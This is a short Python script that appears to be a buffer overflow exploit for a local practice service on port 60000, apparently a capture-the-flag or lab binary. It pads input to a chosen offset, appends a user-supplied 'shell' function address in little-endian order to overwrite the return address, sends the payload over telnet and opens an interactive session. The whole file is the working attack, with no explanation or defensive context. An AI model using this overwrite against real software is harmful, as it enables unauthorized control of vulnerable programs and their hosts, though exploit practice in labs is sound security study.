import telnetlib

# Open connection
tn = telnetlib.Telnet("127.0.0.1",60000)

offset = int(input("Offset (40?):"))
target_addr = input("Target (shell) address (eg. 5647740e61b5): ")

buff = offset*(b'x')

addr = bytearray.fromhex(target_addr)
addr.reverse()
buff += addr

# Sending buffer
tn.write(buff)

# Emulate telnet/terminal
tn.interact()
